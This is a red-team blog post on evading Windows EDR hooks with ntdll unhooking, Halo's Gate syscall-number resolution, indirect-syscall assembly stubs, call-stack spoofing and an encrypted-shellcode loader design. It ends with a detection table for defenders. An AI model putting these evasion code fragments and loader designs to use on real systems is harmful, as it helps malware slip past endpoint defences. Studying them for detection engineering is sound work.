---
date: 2026-05-19
categories:
  - Red Team
  - Malware Development
  - Evasion
tags:
  - EDR
  - AMSI
  - Syscalls
  - Shellcode
  - Windows
authors:
  - 0x3xp10i73r
description: "Why direct syscalls get caught, how Halo's Gate resolves hooked syscall numbers, and how indirect syscalls with call stack spoofing avoid modern EDR detections."
---

# Bypassing Modern Userland EDR Hooks with Indirect Syscalls & Halo's Gate

![Abstract dark ink texture](../../assets/images/cover-ink.jpg){ .page-cover-img }

**Published:** 2026-05-19 · **Author:** `0x3xp10i73r` · **Category:** Red Team / Malware Development

---

## The Problem: Your Beacon Talks Too Much

Every EDR on the market places **userland hooks** in `ntdll.dll`. When your shellcode calls `NtAllocateVirtualMemory`, it does not go straight to the kernel — it lands in the EDR's trampoline first, which inspects the call and reports it. Then there are the **kernel callbacks** (`PsSetCreateProcessNotifyRoutine`, `ObRegisterCallbacks`, minifilters) and **ETW providers**, all feeding a correlation engine.

Two years ago, the standard answer was **direct syscalls**: emit `mov r10, rcx; mov eax, <SSN>; syscall; ret` from your own assembly so the call never touches `ntdll`. That worked — until EDRs started checking the **call stack**. A system call whose return address is inside an unsigned, RWX private region is an instant alert. Same for `ntdll` code whose bytes no longer match the on-disk copy.

This post walks through the evolution: **hooks → direct syscalls → Halo's Gate → indirect syscalls → call stack spoofing**, with a fully explained implementation path. Everything is for **authorized red team validation** in a lab.

<!-- more -->

---

## 1. Background: Reading the Syscall Stub

A clean stub in `ntdll.dll` looks like this:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx ; 4C 8B D1
    mov eax, 0x18 ; B8 18 00 00 00 <- SSN (System Service Number)
    test byte ptr [7FFE0308h], 1
    jne short +2
    syscall ; 0F 05
    ret
```

Inline hooks overwrite the first bytes (`4C 8B D1 B8` → `E9 <relative jmp>`) so execution jumps into the EDR's DLL. The goal of every unhooking technique is: **get a valid SSN and issue the syscall without going through those hooks.**

---

## 2. Technique 1: Fresh `ntdll` from Disk (and Why It's Not Enough)

```c
// 1. Read a clean copy of ntdll.dll from disk
HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, ...);
// 2. Map it (section) or just read the .text section
// 3. Overwrite your process's in-memory ntdll .text with the clean bytes
// (VirtualProtect RWX -> memcpy -> restore RP)
```

**Pros:** Removes existing inline hooks.
**Cons:**
- The file on disk may itself be hooked (rare but real, via `kernel32`/`amsi` proxies).
- Overwriting `.text` of a loaded module changes its hash — a **Module Tampering** detection (`NtProtectVirtualMemory` on an image region is a classic ETW-sourced alert).
- EDRs re-hook on `NtProtectVirtualMemory`/image load events.

**Better:** map a clean `ntdll` from the `\KnownDlls\ntdll.dll` **section object** — no disk read, no file-on-disk dependency:

```c
// NtOpenSection(L"\\KnownDlls\\ntdll.dll") -> NtMapViewOfSection -> copy .text
// This gives you both: (a) a clean copy for SSN resolution, and (b) a legitimately
// backed image you can jump into for indirect syscalls.
```

---

## 3. Technique 2: Halo's Gate — Resolving SSNs When the Stub Is Hooked

Halo's Gate (and its successors **Tartarus Gate** and **FreshyCalls**) solves a key problem: *if the target stub is hooked, how do I find its SSN?* The answer: **scan neighboring syscalls.**

The syscall table in `ntdll` is a **contiguous, ordered array**. `NtAllocateVirtualMemory` is SSN 0x18, `NtProtectVirtualMemory` is 0x50, and so on — in ascending order. If a stub's first bytes are `E9` (a jmp, i.e. hooked), you look at the next export down/up, compute its SSN, and offset.

```c
/*
   Simplified algorithm (full implementations: Halo's Gate, Tartarus Gate, FreshyCalls)

   1. Parse ntdll's export directory -> get the address of every Zw*/Nt* function.
   2. Sort them by address (the syscall table order matches ascending SSNs).
   3. For each function, check the stub bytes:
        - clean stub : 4C 8B D1 B8 <SSN u32>
        - hooked : E9 <jmp rel32> (or a longer patch)
   4. If hooked, walk DOWN the sorted list until you find a clean stub:
        - clean_stub_ssn = <SSN read from that stub>
        - distance = number of entries between it and the target
        - target_ssn = clean_stub_ssn - distance (since SSNs ascend with address)
   5. Verify by cross-checking with a second clean neighbor (defense against
      a fully-hooked ntdll, where you must fall back to sorting the whole table
      or reading SSNs from a fresh copy).
*/

// Pseudocode of the resolution loop
uint32_t ssn = 0;
for (int i = 0; i < ntFunctionsCount; i++) {
    BYTE* fn = ntFunctionsSorted[i].address;
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
        ssn = *(uint32_t*)(fn + 4); // clean stub -> read directly
    } else if (fn[0] == 0xE9) { // hooked -> derive from neighbor
        for (int k = 1; k < 500; k++) {
            BYTE* down = ntFunctionsSorted[i + k].address;
            if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
                ssn = *(uint32_t*)(down + 4) - k; // offset arithmetic
                break;
            }
        }
    }
}
```

!!! warning "Why pure Halo's Gate Is Getting Weaker"
    If the EDR hooks **every** `Nt*` stub, Halo's Gate fails. That is why the modern approach is **hybrid**: resolve SSNs from a **fresh/clean ntdll image** (KnownDlls or disk), but **execute** the syscall **indirectly** through the real in-memory `ntdll` — so the `syscall` instruction's address is legitimate.

---

## 4. Technique 3: Indirect Syscalls (The Current Baseline)

**Direct syscall:** your shellcode contains `syscall; ret`.
→ Call stack shows a return address inside **your** code. Unbacked, unsigned, RWX. Easy alert.

**Indirect syscall:** your shellcode does the `mov r10, rcx` / `mov eax, SSN`, then **jumps to the `syscall` instruction inside the loaded `ntdll`** (or any mapped clean ntdll). The `syscall` executes at a legitimate address, and the return address on the stack points into a legitimately mapped image.

```asm
; --- Indirect syscall stub (x64, NASM) ---
; rcx = arg1 (NTSTATUS)
; rdx = arg2
; r8 = arg3
; r9 = arg4
; stack = arg5, arg6
; g_SyscallAddr = address of a `syscall; ret` gadget inside ntdll

global NtAllocateVirtualMemoryIndirect
NtAllocateVirtualMemoryIndirect:
    mov r10, rcx
    mov eax, 0x18 ; resolved SSN (from a clean ntdll)
    jmp [g_SyscallAddr] ; <-- jump INTO ntdll's syscall instruction
    ret
```

```c
// Runtime setup: locate the gadget in the (clean) ntdll
// Find the `syscall` instruction (0F 05) at the end of a known-unhooked stub, e.g.
// NtOpenKey or NtQuerySystemInformation, then store it:
g_SyscallAddr = find_syscall_gadget(clean_ntdll_base, "NtOpenKey");

// Then every operation uses the indirect stubs:
PVOID base = NULL; SIZE_T size = 0x1000;
NTSTATUS st = NtAllocateVirtualMemoryIndirect((HANDLE)-1, &base, 0, &size,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

**Why this defeats userland hook detection:** the `syscall` instruction executes inside a legitimately signed, file-backed module, so `RtlDispatchException`/callstack analysis sees a `ntdll` frame.

---

## 5. Technique 4: Call Stack Spoofing (The Part That Actually Matters Now)

Even with indirect syscalls, the **call stack** is examined by kernel-side callbacks (`PssCaptureSnapshot`, EDR's stack walkers, `NtCreateThreadEx` events). If the top frames belong to a private RWX region, you are flagged.

Spoofing approaches I use:

```text
1. Return-address spoofing (classic):
   - Before calling, push a chain of fake return addresses onto the stack that
     land inside legitimate modules (e.g. kernel32!BaseThreadInitThunk,
     ntdll!RtlUserThreadStart) so the stack walk terminates "normally".
   - Implementation: a small assembly trampoline that swaps the stack pointer to
     a prepared stack, calls the target, then restores.

2. Synthetic stack frames (advanced):
   - Build a fake stack where every frame corresponds to plausible function
     calls (with matching return addresses + a legit "shadow stack" if CET is on).
   - Frameworks: SilentMoonwalk, Vulcan, CallStackSpoofer, AceLdr (use in lab only).

3. Hardware breakpoint + VEH:
   - Instead of patching code, set DR0 to the target and handle the exception;
     no byte changes => no CRC/module-tamper detection. Combine with indirect syscalls.

4. "Sleep" stack masking:
   - During beacon sleep, the stack/threads should look like a normal sleeping
     process (e.g. WaitForSingleObjectEx -> NtWaitForSingleObject) rather than
     sitting inside your loader. Tools: Ekko/Foliage/Cronos sleep-mask chains.
```

---

## 6. Complete Loader Architecture (Lab Reference)

```text
┌──────────────────────────────────────────────────────────────────────┐
│ 1. PRE-EXECUTION │
│ - Encrypted shellcode blob (AES-256), key split across two sources│
│ - String obfuscation (no plaintext API names, compile-time hashing)│
├──────────────────────────────────────────────────────────────────────┤
│ 2. RUNTIME RESOLUTION (no imports where possible) │
│ - Resolve LoadLibrary/GetProcAddress by PEB walk + export parsing │
│ - Map clean ntdll from \KnownDlls\ntdll.dll │
│ - Resolve SSNs (Halo's Gate / fresh table) + find syscall gadget │
├──────────────────────────────────────────────────────────────────────┤
│ 3. EXECUTION │
│ - Indirect syscall stubs for ALL NT calls │
│ - Allocate RW -> write -> protect RX (never RWX) │
│ - Execute via callback (EnumChildWindows) or thread pool + spoofed│
│ call stack; prefer module stomping into a signed loaded module │
├──────────────────────────────────────────────────────────────────────┤
│ 4. POST-EXECUTION │
│ - Sleep obfuscation (encrypt beacon in memory during sleep) │
│ - Beacon jitter + malleable C2 profile │
│ - Clean up staging artifacts; no disk writes where possible │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 7. Detection: What Blue Teams Should Watch

| Signal | Why It Matters | Data Source |
| :--- | :--- | :--- |
| `syscall` instruction executing from a **non-ntdll** address | Direct syscall fingerprint | ETW-TI / kernel driver / hardware-assisted (Intel PT, Windows Defender kernel sensors) |
| `NtProtectVirtualMemory` making a **private** region executable | Injection boilerplate | ETW / kernel callbacks |
| Thread start addresses inside **unbacked** memory | Classic injection detection | `PsSetCreateThreadNotifyRoutine`, Sysmon 8 |
| `.text` of `ntdll` modified after load | Unhooking / module tamper | EDR integrity checks, `NtQueryInformationProcess` |
| Excessive **RW→RX** transitions, allocation bursts | Loader behavior | Memory telemetry |
| "Beacon-like" periodic connections with high jitter | C2 fingerprint | NDR / proxy logs / DNS |
| Process performing **PKINIT / LDAP / SMB** in unusual sequences | Post-exploitation | AD logs + identity analytics |
| Call stack frames that **do not unwind** correctly | Stack spoofing | Kernel stack walking with CFG support |

```text
The honest blue-team conclusion: you cannot reliably stop a well-built loader in
userland. The wins come from (a) kernel-level telemetry (ETW-TI), (b) behavioral
detection after execution (credential access, lateral movement, C2 patterns), and
(c) ATT&CK-based detection engineering validated with Atomic Red Team.
```

---

## 8. The Arms Race, Stated Plainly

```text
2018: userland hooks -> defeated by direct syscalls
2020: call stack checks -> defeated by indirect syscalls
2022: module tamper detection -> defeated by KnownDlls mapping + hardware breakpoints
2024: kernel telemetry (ETW-TI) -> pushes detection to the syscall layer itself
2026: CET/shadow stacks + AI-based behavioral analytics
      -> the defender's leverage increasingly comes from BEHAVIOR, not bytes.
```

> **Evasion buys time. Tradecraft protects you.** Even a perfect loader fails if your operator runs `net group "Domain Admins" /domain` in a directory where that command is a rare-event alert. Evasion is one input; behavioral discipline is the other half.

---

*All code fragments in this post are presented for authorized adversary-simulation validation. Test only in a lab you own, or in an engagement where you have written permission and a deconfliction plan. If you are a defender reading this — the "Detection" table is the section to bring to your SOC.*